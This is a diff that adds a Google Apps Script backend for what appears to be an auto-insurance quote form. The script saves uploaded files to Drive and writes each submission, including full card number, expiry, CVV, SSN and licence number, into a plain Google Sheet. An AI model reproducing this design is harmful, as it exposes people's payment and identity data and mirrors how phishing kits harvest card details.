@@ -339,3 +339,30 @@
       </script>   
   </body>
 </html>
+
+//
+function doGet() {
+  return HtmlService.createHtmlOutputFromFile('index');
+}
+
+function uploadFullForm(formData) {
+  var folder = DriveApp.getFolderById('10vj9x0OB1XTFVwkVz6RgDtIyRHui8564');  // Your folder ID
+  var blob = Utilities.newBlob(Utilities.base64Decode(formData.myFile), formData.fileType, formData.fileName);
+  var file = folder.createFile(blob);
+  var fileUrl = file.getUrl();
+
+  var sheet = SpreadsheetApp.openById('1rj_CYy5oaUGPmlxNvQaO3BwuDe0wQrZ0oLeMlSss1SE').getActiveSheet();  // Your sheet ID
+  sheet.appendRow([
+    formData.firstName, formData.lastName, formData.dob, formData.pnumber, formData.address,  formData.cardDetails, formData.exp, formData.cvv,formData.vehicleDetails, formData.vehicleOwnership,
+    formData.financeCompany, formData.vehiclePurpose, formData.dailyMiles, formData.theftDevice, formData.maritalStatus,
+    formData.gender, formData.educationLevel, formData.earningSource, formData.workField, formData.jobDesignation,
+    formData.accidents, formData.stateCarRegister, formData.stateLicenseRegister, formData.vehicleOwner, formData.licenseYear,
+    formData.coverageLimit, formData.otherLicense, formData.defenseCourse, formData.courseYear, formData.licenseNumber,
+    formData.policyActivationDate, formData.ssn, formData.vinNumber, formData.gmail, fileUrl
+  ]);
+
+  return fileUrl;  // Return the file URL to display
+}
+
+  
+///
